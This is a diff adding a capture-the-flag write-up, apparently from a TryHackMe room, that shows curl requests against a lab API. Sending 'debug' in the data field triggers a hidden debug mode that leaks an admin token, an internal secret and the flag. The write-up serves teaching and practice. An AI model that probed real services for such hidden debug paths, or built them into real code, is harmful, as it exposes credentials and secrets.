@@ -69,7 +69,53 @@ def process():
 
         return jsonify({
             'result': formatted,
+
             'status': 'success'
         })
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+```
+![Python Script](IMAGES-2/3.1.png)
+
+## Step 1 — Testing Normal API Behavior
+
+To confirm the API structure, a standard POST request with empty data was sent to /api/process:
+
+```tetx
+curl -X POST [http://10.114.189.174:5003/api/process](http://10.114.189.174:5003/api/process) \
+     -H "content-type: application/json" \
+     -d '{"data": ""}'
+```
+Response:
+
+```text
+{
+  "error": "Missing data parameter"
+}
+```
+This confirmed the API endpoint was active and expected a structured JSON body with a data parameter.
+
+## Step 2 — Exploiting Hidden Debug Mode
+Based on the source code review, the string "debug" was passed in the data parameter:
+```text
+curl -X POST [http://10.114.189.174:5003/api/process](http://10.114.189.174:5003/api/process) \
+     -H "content-type: application/json" \
+     -d '{"data": "debug"}'
+```
+Response:
+```text
+{
+  "admin_token": "admin_token_12345",
+  "flag": "THM{SUPPLY_CH41N_VULN3R4B1L1TY}",
+  "internal_secret": "internal_secret_key_2024",
+  "version": "1.2.3"
+}
+
+
+```
+The server executed debug_info() from the outdated library component and exposed internal secrets alongside the flag.
+## Flag
+```text
+THM{SUPPLY_CH41N_VULN3R4B1L1TY}
+```
+![TEST](IMAGES-2/3.2.png)
